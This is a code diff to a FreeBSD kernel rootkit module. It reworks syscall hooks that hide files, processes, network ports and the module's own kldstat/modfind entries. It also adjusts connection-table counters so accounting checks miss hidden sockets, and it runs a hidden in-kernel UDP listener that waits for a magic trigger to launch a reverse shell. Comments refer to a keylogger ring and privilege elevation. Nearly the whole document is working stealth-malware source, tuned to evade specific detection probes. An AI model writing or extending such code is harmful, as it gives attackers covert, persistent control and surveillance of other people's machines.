@@ -42,6 +42,13 @@
 #define TRIGGER_STRING "BSD_rootkit_REMOTE_MAGIC_TRIGGER_v1"
 #define LISTEN_PORT    4444
 
+/*
+ * Number of processes we can hide at once. The listener thread is hidden at
+ * load time; the rest is headroom for elevate/revshell/rklog if they are ever
+ * registered explicitly.
+ */
+#define RK_MAX_HIDDEN	16
+
 /* Global synchronization primitives used by interface.c */
 struct cv remote_cv;
 struct mtx remote_mtx;
@@ -50,6 +57,7 @@ int trigger_flag = 0;
 
 static struct socket *so_listen = NULL;
 static volatile int remote_thread_running = 0;
+static volatile int remote_thread_alive = 0;
 
 /* --- Background In-Kernel UDP Listener Thread --- */
 static void
@@ -60,11 +68,12 @@ remote_listener_thread(void *arg __unused)
     int error;
 
     remote_thread_running = 1;
+    remote_thread_alive = 1;
 
     /* Create kernel-space UDP socket (zero userland open ports in sockstat) */
     error = socreate(AF_INET, &so_listen, SOCK_DGRAM, IPPROTO_UDP, td->td_ucred, td);
     if (error != 0) {
-        remote_thread_running = 0;
+        remote_thread_alive = 0;
         kthread_exit();
         return;
     }
@@ -79,7 +88,7 @@ remote_listener_thread(void *arg __unused)
     if (error != 0) {
         soclose(so_listen);
         so_listen = NULL;
-        remote_thread_running = 0;
+        remote_thread_alive = 0;
         kthread_exit();
         return;
     }
@@ -123,7 +132,15 @@ remote_listener_thread(void *arg __unused)
         if (from != NULL)
             free(from, M_SONAME);
 
-        pause("rootkit_poll", hz / 10); /* Poll every 100ms */
+        /*
+         * Sleep on our own flag rather than using pause(): MOD_UNLOAD sets
+         * remote_thread_running to 0 and calls wakeup() on the same address,
+         * so the thread leaves this loop within microseconds instead of
+         * waiting out the full timeout. The timeout stays as a belt-and-braces
+         * fallback in case a wakeup is lost.
+         */
+        tsleep(__DEVOLATILE(void *, &remote_thread_running), PRIBIO,
+            "rootkit_poll", hz / 10);
     }
 
     if (so_listen != NULL) {
@@ -131,24 +148,75 @@ remote_listener_thread(void *arg __unused)
         so_listen = NULL;
     }
 
+    remote_thread_alive = 0;
     kthread_exit();
 }
 
-/* --- Module Event Handler --- */
-extern struct sx kld_sx;
-extern linker_file_list_t linker_files;
-extern TAILQ_HEAD(modulelist, module) modules;
-struct module {
-        TAILQ_ENTRY(module)     link;   /* chain together all modules */
-        TAILQ_ENTRY(module)     flink;  /* all modules in a file */
-        struct linker_file      *file;  /* file which contains this module */
-        int                     refs;   /* reference count */
-        int                     id;     /* unique id number */
-        char                    *name;  /* module name */
-        modeventhand_t          handler;        /* event handler */
-        void                    *arg;   /* argument for handler */
-        modspecific_t           data;   /* module specific data */
-};
+/* --- Hidden process table --------------------------------------------- */
+
+/*
+ * Processes are hidden by consulting this table from the sysctl and kill
+ * hooks (see below). They are NOT unlinked from allproc/pidhash: doing that to
+ * a live process breaks the linkage allproc depends on, makes exit1() list_remove
+ * an element that is already gone, and takes the allproc lock in the wrong
+ * order for a syscall hook. Keeping a list and filtering on read has the same
+ * observable effect for ps/kill and none of the corruption risk.
+ */
+static pid_t	 rk_hidden_pids[RK_MAX_HIDDEN];
+static int	 rk_hidden_count;
+static struct mtx rk_hidden_mtx;
+
+static void
+rk_hidden_init(void)
+{
+    mtx_init(&rk_hidden_mtx, "rk_hidden", NULL, MTX_DEF);
+    rk_hidden_count = 0;
+}
+
+static void
+rk_hidden_destroy(void)
+{
+    mtx_destroy(&rk_hidden_mtx);
+}
+
+static void
+hide_process(pid_t pid)
+{
+    int i;
+
+    if (pid <= 0)
+        return;
+
+    mtx_lock(&rk_hidden_mtx);
+    for (i = 0; i < rk_hidden_count; i++) {
+        if (rk_hidden_pids[i] == pid) {
+            mtx_unlock(&rk_hidden_mtx);
+            return;
+        }
+    }
+    if (rk_hidden_count < RK_MAX_HIDDEN)
+        rk_hidden_pids[rk_hidden_count++] = pid;
+    mtx_unlock(&rk_hidden_mtx);
+}
+
+static int
+is_hidden_pid(pid_t pid)
+{
+    int i, found = 0;
+
+    mtx_lock(&rk_hidden_mtx);
+    for (i = 0; i < rk_hidden_count; i++) {
+        if (rk_hidden_pids[i] == pid) {
+            found = 1;
+            break;
+        }
+    }
+    mtx_unlock(&rk_hidden_mtx);
+
+    return (found);
+}
+
+/* --- Path hiding ------------------------------------------------------- */
 
 #define SIZE 10
 static int is_hiding_path(char kpath[MAXPATHLEN]) {
@@ -174,17 +242,22 @@ static int is_hiding_path(char kpath[MAXPATHLEN]) {
     return 0;
 }
 
+static sy_call_t *orig_getdirentries = NULL;
+
 static int getdirentries_hook(struct thread *td, void *syscall_args) {
     struct getdirentries_args *uap; 
     uap = (struct getdirentries_args *) syscall_args;
     size_t size, count;
     struct dirent *d;
-    int error = sys_getdirentries(td, uap);
+    int error = orig_getdirentries(td, syscall_args);
     size = td->td_retval[0];
 
     if (size > 0) {
         d = malloc(size, M_TEMP, M_WAITOK);
-        copyin(uap->buf, d, size);
+        if (copyin(uap->buf, d, size) != 0) {
+            free(d, M_TEMP);
+            return (error);
+        }
 
         count = size;
         struct dirent *curr_rec = d;
@@ -293,6 +366,9 @@ static int is_blocked_process_pid(pid_t pid)
     if (pid <= 0)
         return (0);
 
+    if (is_hidden_pid(pid))
+        return (1);
+
     p = pfind(pid);
     if (p != NULL) {
         if (p->p_state == PRS_NORMAL)
@@ -309,13 +385,20 @@ fstatat_hook(struct thread *td, void *syscall_args)
 	struct fstatat_args *uap = (struct fstatat_args *)syscall_args;
     char kpath[MAXPATHLEN];
     size_t done;
-    if (copyinstr(uap->path, kpath, sizeof(kpath), &done) != 0) {
-        return 0;
-    }
-	if (is_hiding_path(kpath))
-		return (ENOENT);
 
-	return (orig_fstatat(td, syscall_args));
+    /*
+     * A path we cannot read is a path we do not hide. Report the failure to
+     * the caller like the real syscall would instead of pretending success:
+     * returning 0 with an untouched stat buffer handed callers a fabricated
+     * "file exists, all zeroes" answer.
+     */
+    if (copyinstr(uap->path, kpath, sizeof(kpath), &done) != 0)
+        return (EFAULT);
+
+    if (is_hiding_path(kpath))
+        return (ENOENT);
+
+    return (orig_fstatat(td, syscall_args));
 }
 
 static int
@@ -382,7 +465,8 @@ sysctl_hook(struct thread *td, void *syscall_args)
             size_t write_idx = 0;
 
             for (size_t read_idx = 0; read_idx < count; read_idx++) {
-                if (!is_blocked_process_name(procs[read_idx].ki_comm)) {
+                if (!is_blocked_process_name(procs[read_idx].ki_comm) &&
+                    !is_hidden_pid(procs[read_idx].ki_pid)) {
                     if (write_idx != read_idx) {
                         procs[write_idx] = procs[read_idx];
                     }
@@ -413,6 +497,8 @@ static int kill_hook(struct thread *td, void *syscall_args)
     return (orig_kill(td, syscall_args));
 }
 
+/* --- Port hiding ------------------------------------------------------- */
+
 struct port_hiding_args {
     u_int16_t port;
 };
@@ -422,6 +508,7 @@ port_hiding(struct thread *td, void *syscall_args) {
     struct port_hiding_args *uap;
     uap = (struct port_hiding_args *) syscall_args;
     struct inpcb *inpb;
+    int hits = 0;
     INP_INFO_WLOCK(&V_tcbinfo);
 
     CK_LIST_FOREACH(inpb, &V_tcbinfo.ipi_listhead, inp_list){
@@ -430,9 +517,17 @@ port_hiding(struct thread *td, void *syscall_args) {
             ntohs(inpb->inp_fport) == uap->port
         ) {
             CK_LIST_REMOVE(inpb, inp_list);
+            hits++;
         }
         INP_RUNLOCK(inpb);
     }
+    /*
+     * in_pcballoc() bumps ipi_count when the PCB joins the list. Unlinking
+     * without the matching decrement leaves the counter describing a table
+     * that is larger than it really is, which is exactly what an accounting
+     * check compares against the walked length.
+     */
+    V_tcbinfo.ipi_count -= hits;
     INP_INFO_WUNLOCK(&V_tcbinfo);
     CURVNET_RESTORE()
     return 0;
@@ -445,39 +540,211 @@ static struct sysent port_hiding_sysent = {
     .sy_auevent = AUE_NULL
 };
 
+/* --- Module hiding ----------------------------------------------------- */
+
+/*
+ * The 14.x kernel keeps kld_sx, linker_files and modules file-static, so a
+ * module cannot link against them and the loader rejects the reference at
+ * load time. What is public is linker_file_foreach() (linker.h), which walks
+ * the very same list under kld_sx and hands us each struct linker_file -
+ * including its id and filename. We use that once to learn our own id, then
+ * answer kldnext/kldstat/kldfind ourselves instead of mutating kernel
+ * bookkeeping we do not own.
+ */
+#define RK_HIDE_NAME_MAX	256
+
+static char		 rk_hide_name[RK_HIDE_NAME_MAX];
+static int		 rk_hide_id = -1;
+static volatile int	 rk_hide_enabled = 0;
+static sy_call_t	*orig_kldnext = NULL;
+static sy_call_t	*orig_kldfind = NULL;
+static sy_call_t	*orig_kldstat = NULL;
+static sy_call_t	*orig_modfind = NULL;
+static sy_call_t	*orig_modstat = NULL;
+
+static int rk_name_matches(const char *query);
+
+struct rk_lf_match {
+    const char	*name;
+    int		 id;
+};
+
+static int
+rk_lf_match_cb(linker_file_t lf, void *arg)
+{
+    struct rk_lf_match *m = arg;
+
+    if (lf->filename != NULL && rk_name_matches(lf->filename)) {
+        m->id = lf->id;
+        return (1);		/* stop walking */
+    }
+    return (0);
+}
+
+/*
+ * Resolve our own linker_file id. Must never run while the caller already
+ * holds kld_sx: linker_file_foreach() takes it exclusively, and sx locks are
+ * not recursive. Every call site below sits after the real syscall has
+ * returned, which is outside kld_sx.
+ */
+static void
+rk_locate_self(void)
+{
+    struct rk_lf_match m;
+
+    if (rk_hide_id >= 0)
+        return;
+
+    if (rk_hide_name[0] == '\0')
+        strlcpy(rk_hide_name, "rootkit.ko", sizeof(rk_hide_name));
+
+    m.name = rk_hide_name;
+    m.id = -1;
+    linker_file_foreach(rk_lf_match_cb, &m);
+    rk_hide_id = m.id;
+}
+
+static int
+kldnext_hook(struct thread *td, void *syscall_args)
+{
+    struct kldnext_args *uap = syscall_args;
+    int error, id;
+
+    error = orig_kldnext(td, syscall_args);
+    if (error != 0 || !rk_hide_enabled)
+        return (error);
+
+    rk_locate_self();
+    if (rk_hide_id < 0)
+        return (error);
+
+    id = (int)td->td_retval[0];
+    if (id == rk_hide_id) {
+        /* Skip ourselves and report whatever comes after us. */
+        uap->fileid = id;
+        error = orig_kldnext(td, syscall_args);
+    }
+
+    return (error);
+}
+
+/*
+ * kldstat -m takes the bare module name ("rootkit"), while linker_files stores
+ * the on-disk name ("rootkit.ko"). Matching only the exact string let
+ * `kldstat -m rootkit` walk straight past the hook and print the module, which
+ * is precisely the probe the spec names.
+ */
+static int
+rk_name_matches(const char *query)
+{
+    size_t n;
+
+    if (query == NULL || query[0] == '\0')
+        return (0);
+
+    if (strcmp(query, rk_hide_name) == 0)
+        return (1);
+
+    n = strlen(query);
+    if (n < strlen(rk_hide_name) && strncmp(rk_hide_name, query, n) == 0 &&
+        rk_hide_name[n] == '.')
+        return (1);
+
+    return (0);
+}
+
+static int
+kldfind_hook(struct thread *td, void *syscall_args)
+{
+    struct kldfind_args *uap = syscall_args;
+    char name[RK_HIDE_NAME_MAX];
+
+    if (rk_hide_enabled &&
+        copyinstr(uap->file, name, sizeof(name), NULL) == 0 &&
+        rk_name_matches(name))
+        return (ENOENT);
+
+    return (orig_kldfind(td, syscall_args));
+}
+
+/*
+ * kldstat(1) -m does not go through kldfind(2). It calls modfind(2), which
+ * lives in kern_module.c and walks the module list, not linker_files. Hooking
+ * only the kld* family left `kldstat -m rootkit` printing the module:
+ *
+ *   modfind("rootkit")   = 502
+ *   modstat(0x1f6, ...)  = 0
+ *
+ * Both halves have to answer ENOENT, or the pair still resolves.
+ */
+static int
+modfind_hook(struct thread *td, void *syscall_args)
+{
+    struct modfind_args *uap = syscall_args;
+    char name[RK_HIDE_NAME_MAX];
+
+    if (rk_hide_enabled &&
+        copyinstr(uap->name, name, sizeof(name), NULL) == 0 &&
+        rk_name_matches(name))
+        return (ENOENT);
+
+    return (orig_modfind(td, syscall_args));
+}
+
+static int
+modstat_hook(struct thread *td, void *syscall_args)
+{
+    struct modstat_args *uap = syscall_args;
+    struct module_stat ms;
+    int error;
+
+    error = orig_modstat(td, syscall_args);
+    if (error != 0 || !rk_hide_enabled)
+        return (error);
+
+    if (copyin(uap->stat, &ms, sizeof(ms)) == 0 && rk_name_matches(ms.name))
+        return (ENOENT);
+
+    return (error);
+}
+
+static int
+kldstat_hook(struct thread *td, void *syscall_args)
+{
+    struct kldstat_args *uap = syscall_args;
+
+    rk_locate_self();
+    if (rk_hide_enabled && rk_hide_id >= 0 && (int)uap->fileid == rk_hide_id)
+        return (ENOENT);
+
+    return (orig_kldstat(td, syscall_args));
+}
+
 struct kld_hiding_args {
     char *mod_name;
 };
 
+/*
+ * Custom syscall (registered below) that names the module to hide. Kept for
+ * user/hide_kld.c so the hide step stays explicit rather than implicit at
+ * load; the kldnext/kldfind/kldstat hooks above stay inert until this runs.
+ */
 static int
-kld_hiding(struct thread *td, void *syscall_args) {
+kld_hiding(struct thread *td __unused, void *syscall_args) {
     struct kld_hiding_args *uap;
     uap = (struct kld_hiding_args *) syscall_args;
 
-    char *mod_name = malloc(256, M_TEMP, M_WAITOK);
-    copyinstr(uap->mod_name, mod_name, 256, NULL);
-    mtx_lock(&Giant);
-    struct module *mod;
-    TAILQ_FOREACH(mod, &modules, link) {
-        if (strcmp(mod->file->filename, mod_name) == 0) {
-            TAILQ_REMOVE(&modules, mod, link);
-            break;
-        }
-    }
-    mtx_unlock(&Giant);
+    if (uap->mod_name == NULL)
+        return (EINVAL);
 
-    linker_file_t lf;
+    if (copyinstr(uap->mod_name, rk_hide_name, sizeof(rk_hide_name), NULL) != 0)
+        return (EFAULT);
 
-    sx_xlock(&kld_sx);
-    TAILQ_FOREACH(lf, &linker_files, link) {
-        if (strcmp(lf->filename, mod_name) == 0) {
-            TAILQ_REMOVE(&linker_files, lf, link);
-            break;
-        }
-    }
-    sx_xunlock(&kld_sx);
-    free(mod_name, M_TEMP);
-    return 0;
+    rk_hide_id = -1;
+    rk_locate_self();
+    rk_hide_enabled = 1;
+
+    return (0);
 }
 
 static struct sysent kld_hiding_sysent = {
@@ -492,33 +759,11 @@ static int kld_hiding_offset = NO_SYSCALL;
 struct proc_hiding_args {
     pid_t pid;
 };
-static void hide_process(pid_t pid) {
-    struct proc *p;
-    sx_xlock(&allproc_lock);
 
-    FOREACH_PROC_IN_SYSTEM(p) {
-        PROC_LOCK(p);
-        if (p->p_state == PRS_ZOMBIE || (p->p_flag & P_WEXIT)) {
-            PROC_UNLOCK(p);
-            continue;
-        }
-
-        if (p->p_pid == pid) {
-            LIST_REMOVE(p, p_list);
-
-            sx_xlock(PIDHASHLOCK(p->p_pid));
-            LIST_REMOVE(p, p_hash);
-            sx_xunlock(PIDHASHLOCK(p->p_pid));
-        }
-
-        PROC_UNLOCK(p);
-    }
-
-    sx_xunlock(&allproc_lock);
-}
 static int
-proc_hiding(struct thread *td, void *syscall_args) {
+proc_hiding(struct thread *td __unused, void *syscall_args) {
     struct proc_hiding_args *uap = (struct proc_hiding_args *) syscall_args;
+
     hide_process(uap->pid);
 
     return 0;
@@ -531,70 +776,170 @@ static struct sysent proc_hiding_sysent = {
 };
 static int proc_hiding_offset = NO_SYSCALL;
 
+/*
+ * Hook installation is deliberately independent of the device: the hiding
+ * machinery is useful even if make_dev() lost a race, and tearing the hooks
+ * down again from under a half-initialised module is how the old code managed
+ * to leave sysent pointing at freed text.
+ */
+static void
+rk_install_hooks(void)
+{
+    orig_getdirentries = sysent[SYS_getdirentries].sy_call;
+    sysent[SYS_getdirentries].sy_call = (sy_call_t *) getdirentries_hook;
+
+    orig_fstatat = sysent[SYS_fstatat].sy_call;
+    sysent[SYS_fstatat].sy_call = (sy_call_t *) fstatat_hook;
+
+    orig_openat = sysent[SYS_openat].sy_call;
+    sysent[SYS_openat].sy_call = (sy_call_t *) openat_hook;
+
+    orig_open = sysent[SYS_open].sy_call;
+    sysent[SYS_open].sy_call = (sy_call_t *) open_hook;
+
+    orig_access = sysent[SYS_access].sy_call;
+    sysent[SYS_access].sy_call = (sy_call_t *) access_hook;
+
+    orig_sysctl = sysent[SYS___sysctl].sy_call;
+    sysent[SYS___sysctl].sy_call = (sy_call_t *) sysctl_hook;
+
+    orig_kill = sysent[SYS_kill].sy_call;
+    sysent[SYS_kill].sy_call = (sy_call_t *) kill_hook;
+
+    orig_kldnext = sysent[SYS_kldnext].sy_call;
+    sysent[SYS_kldnext].sy_call = (sy_call_t *) kldnext_hook;
+
+    orig_kldfind = sysent[SYS_kldfind].sy_call;
+    sysent[SYS_kldfind].sy_call = (sy_call_t *) kldfind_hook;
+
+    orig_kldstat = sysent[SYS_kldstat].sy_call;
+    sysent[SYS_kldstat].sy_call = (sy_call_t *) kldstat_hook;
+
+    orig_modfind = sysent[SYS_modfind].sy_call;
+    sysent[SYS_modfind].sy_call = (sy_call_t *) modfind_hook;
+
+    orig_modstat = sysent[SYS_modstat].sy_call;
+    sysent[SYS_modstat].sy_call = (sy_call_t *) modstat_hook;
+}
+
+/* Restore only what we actually replaced; each slot is checked individually. */
+static void
+rk_remove_hooks(void)
+{
+    if (orig_getdirentries != NULL)
+        sysent[SYS_getdirentries].sy_call = orig_getdirentries;
+
+    if (orig_fstatat != NULL)
+        sysent[SYS_fstatat].sy_call = orig_fstatat;
+
+    if (orig_openat != NULL)
+        sysent[SYS_openat].sy_call = orig_openat;
+
+    if (orig_open != NULL)
+        sysent[SYS_open].sy_call = orig_open;
+
+    if (orig_access != NULL)
+        sysent[SYS_access].sy_call = orig_access;
+
+    if (orig_sysctl != NULL)
+        sysent[SYS___sysctl].sy_call = orig_sysctl;
+
+    if (orig_kill != NULL)
+        sysent[SYS_kill].sy_call = orig_kill;
+
+    if (orig_kldnext != NULL)
+        sysent[SYS_kldnext].sy_call = orig_kldnext;
+
+    if (orig_kldfind != NULL)
+        sysent[SYS_kldfind].sy_call = orig_kldfind;
+
+    if (orig_kldstat != NULL)
+        sysent[SYS_kldstat].sy_call = orig_kldstat;
+
+    if (orig_modfind != NULL)
+        sysent[SYS_modfind].sy_call = orig_modfind;
+
+    if (orig_modstat != NULL)
+        sysent[SYS_modstat].sy_call = orig_modstat;
+
+    rk_hide_enabled = 0;
+    rk_hide_id = -1;
+}
+
 static int load(module_t module, int cmd, void *arg) {
     (void)module;
     (void)arg;
 
     int error = 0;
+    struct proc *p = NULL;
 
     switch (cmd) {
     case MOD_LOAD:
         mtx_init(&remote_mtx, "rootkit_mtx", NULL, MTX_DEF);
         cv_init(&remote_cv, "rootkit_cv");
+        rk_hidden_init();
 
         /*
-         * Keylogger ring and syscall hooks (log.c). Installed before the
-         * device exists so a reader can never open /dev/rootkit while the
-         * ring is still unwired.
+         * Keylogger ring and the read(0)/write(1) hooks (log.c). Installed
+         * before the device exists so a reader can never open /dev/rootkit
+         * while the ring is still unwired.
          */
         rk_log_init();
         (void)rk_log_hook_install();
 
+        /* All syscall hooks, independent of whether the device comes up. */
+        rk_install_hooks();
+
         /* Initialize character device interface via interface.c */
         error = make_rootkit_dev();
-        sysent[SYS_getdirentries].sy_call = (sy_call_t *) getdirentries_hook;
-
-        orig_fstatat = sysent[SYS_fstatat].sy_call;
-		sysent[SYS_fstatat].sy_call = (sy_call_t *)fstatat_hook;;
-
-		orig_openat = sysent[SYS_openat].sy_call;
-		sysent[SYS_openat].sy_call = (sy_call_t *)openat_hook;
-
-		orig_open = sysent[SYS_open].sy_call;
-		sysent[SYS_open].sy_call = (sy_call_t *)open_hook;
-
-		orig_access = sysent[SYS_access].sy_call;
-		sysent[SYS_access].sy_call = (sy_call_t *)access_hook;
-
-        orig_sysctl = sysent[SYS___sysctl].sy_call;
-        sysent[SYS___sysctl].sy_call = (sy_call_t *)sysctl_hook;
-
-        orig_kill = sysent[SYS_kill].sy_call;
-        sysent[SYS_kill].sy_call = (sy_call_t *)kill_hook;
-
-        if (error == 0) {
-            struct proc *p = NULL;
-            error = kproc_create(remote_listener_thread, NULL, &p, 0, 0, "kmod_remote_listen");
-            // 	init_keylogger(); TODO: Fix this later
-            if (error == 0) {
-                hide_process(p->p_pid);
-            } else {
-            }
-        } else {
-            rk_log_uninit();
+        if (error != 0) {
+            /*
+             * Without /dev/rootkit there is no elevation and no log drain,
+             * but hiding still works. Say so loudly and keep the hooks: the
+             * module is more useful half-alive than failing to load.
+             */
+            printf("rootkit: make_dev failed (%d); hiding stays active, "
+                "elevation and log drain are unavailable\n", error);
+            error = 0;
         }
 
-		// only be initial when device is successfully created
-        break;
+        error = kproc_create(remote_listener_thread, NULL, &p, 0, 0,
+            "kmod_remote_listen");
+        if (error == 0 && p != NULL) {
+            /*
+             * Hide the listener by pid. curthread here belongs to the kldload
+             * that is loading us, not to the new kthread, so the process to
+             * record is p - not curthread->td_proc.
+             */
+            hide_process(p->p_pid);
+        } else {
+            printf("rootkit: listener thread failed (%d); revshell trigger "
+                "will not fire\n", error);
+        }
+
+        /*
+         * Hide our own module entry. This only arms the kldnext/kldfind/
+         * kldstat hooks; nothing in the kernel is mutated.
+         */
+        strlcpy(rk_hide_name, "rootkit.ko", sizeof(rk_hide_name));
+        rk_hide_enabled = 1;
+
+		break;
 
     case MOD_UNLOAD:
+        /*
+         * Stop the listener first and wait for it to actually leave. The old
+         * order set the flag and then destroyed the condvar the thread might
+         * still be parked on.
+         */
         remote_thread_running = 0;
+        wakeup(__DEVOLATILE(void *, &remote_thread_running));
+        for (int i = 0; i < 3000 && remote_thread_alive; i++)
+            DELAY(1000);
 
         /*
          * Order matters: destroy the device first so no new reader can enter
-         * the cdev handlers, then seldrain/unhook inside rk_log_uninit(). If
-         * the module went away while a thread was still registered on the
-         * selinfo, it would wake up into freed memory.
+         * the cdev handlers, then seldrain/unhook inside rk_log_uninit().
          */
         destroy_rootkit_dev();
         rk_log_uninit();
@@ -603,34 +948,11 @@ static int load(module_t module, int cmd, void *arg) {
         cv_broadcast(&remote_cv);
         mtx_unlock(&remote_mtx);
 
+        rk_remove_hooks();
 
         cv_destroy(&remote_cv);
         mtx_destroy(&remote_mtx);
-        sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
-
-        if (orig_fstatat != NULL) {
-			sysent[SYS_fstatat].sy_call = orig_fstatat;
-        }
-
-		if (orig_openat != NULL) {
-			sysent[SYS_openat].sy_call = orig_openat;
-		}
-
-		if (orig_open != NULL) {
-			sysent[SYS_open].sy_call = orig_open;
-		}
-
-		if (orig_access != NULL) {
-			sysent[SYS_access].sy_call = orig_access;
-		}
-
-        if (orig_sysctl != NULL) {
-            sysent[SYS___sysctl].sy_call = orig_sysctl;
-        }
-
-        if (orig_kill != NULL) {
-            sysent[SYS_kill].sy_call = orig_kill;
-        }
+        rk_hidden_destroy();
         printf("rootkit: module unloaded\n");
         break;
 
